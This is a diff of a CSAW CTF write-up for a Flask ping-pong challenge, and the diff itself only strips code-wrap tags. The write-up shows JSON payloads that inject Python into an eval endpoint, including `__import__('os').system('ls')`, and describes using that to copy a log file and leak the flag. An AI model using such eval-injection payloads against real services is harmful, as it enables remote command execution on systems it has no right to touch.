@@ -24,7 +24,6 @@ layout:
 
 ## Source Code
 
-{% code overflow="wrap" %}
 
 ```python
 from flask import Flask, render_template, request, session, jsonify, send_file
@@ -144,7 +143,6 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0')
 ```
 
-{% endcode %}
 
 ## Solution
 
@@ -152,49 +150,40 @@ The website features a two-player ping pong game. Aside from the player movement
 
 The last one sounds very interesting! It performs a `deep_eval` on our expression (recursive), so first, we can try an easy win: print the `safetytime` variable.
 
-{% code overflow="wrap" %}
 
 ```json
 { "expr": "safetytime" }
 ```
 
-{% endcode %}
 
 We get a flag!
 
-{% code overflow="wrap" %}
 
 ```json
 { "result": "csawctf{7h1s_1S_n07_7h3_FL49_y0u_4R3_l00K1n9_f0R}", "status": "success" }
 ```
 
-{% endcode %}
 
 Clearly, not the real flag though. We can try system commands, e.g.
 
-{% code overflow="wrap" %}
 
 ```json
 { "expr": "__import__('os').system('ls')" }
 ```
 
-{% endcode %}
 
 They seem to succeed but there's no output.
 
-{% code overflow="wrap" %}
 
 ```json
 { "result": 0, "status": "success" }
 ```
 
-{% endcode %}
 
 I tried `curl` but didn't get a hit.
 
 Next, I was thinking the flag must be in `leaderboard.txt`, which we would get with the correct hash.
 
-{% code overflow="wrap" %}
 
 ```python
 token = cookie.encode('utf-8')
@@ -206,13 +195,11 @@ if tokenHash == '25971dadcb50db2303d6a68de14ae4f2d7eb8449ef9b3818bd3fafd052735f3
 			lbdata = file.read()
 ```
 
-{% endcode %}
 
 I tried to crack it online but no luck.
 
 Finally, I used the `eval` to copy `logs.txt` to `leaderboard.txt` and then called `/get_logs`.
 
-{% code overflow="wrap" %}
 
 ```
 1.kainzow
@@ -238,6 +225,5 @@ hum pressed s
 hum pressed s
 ```
 
-{% endcode %}
 
 Flag: `csawctf{5H1774K3_Mu5Hr00M5_1_fuX0R3d_Up_50n_0F_4_81207CH}`
